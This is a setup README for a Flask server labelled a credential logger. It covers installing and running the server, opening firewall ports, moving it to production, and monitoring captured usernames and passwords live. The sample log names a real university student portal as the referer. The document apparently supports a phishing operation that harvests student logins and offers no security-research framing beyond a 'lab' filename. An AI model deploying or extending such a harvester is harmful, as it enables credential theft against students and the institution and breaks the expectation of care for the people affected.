# Backend Setup - Flask Credential Logger

## Quick Start

### 1. Activate Virtual Environment

```bash
# Linux/Mac
source bin/activate

# Windows
.\Scripts\activate
```

### 2. Install Dependencies

```bash
pip install -r requirements.txt
```

### 3. Run the Server

```bash
python app.py
```

Server will start on `http://0.0.0.0:5000`

## Configuration

### Change Port
Edit `app.py`, line 38:
```python
app.run(host='0.0.0.0', port=5000, debug=True)  # Change port here
```

### View Captured Credentials

**Real-time monitoring:**
```bash
tail -f lab_capture.log
```

**View all logs:**
```bash
cat lab_capture.log
```

## Log Format

Each captured login contains:
```json
{
  "timestamp": "2024-01-15T10:30:45.123456",
  "ip": "192.168.1.50",
  "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
  "referer": "http://ug.nsuk.edu.ng/",
  "accept_language": "en-US,en;q=0.9",
  "credentials": {
    "userId": "student123",
    "password": "password123"
  }
}
```

## Firewall Configuration

Allow incoming connections:
```bash
# Ubuntu/Debian
sudo ufw allow 5000

# CentOS/RHEL
sudo firewall-cmd --add-port=5000/tcp --permanent
sudo firewall-cmd --reload
```

## Production Notes

For production deployment:
1. Set `debug=False` in app.py
2. Use a production WSGI server (gunicorn, uWSGI)
3. Implement proper authentication
4. Use HTTPS
5. Add rate limiting
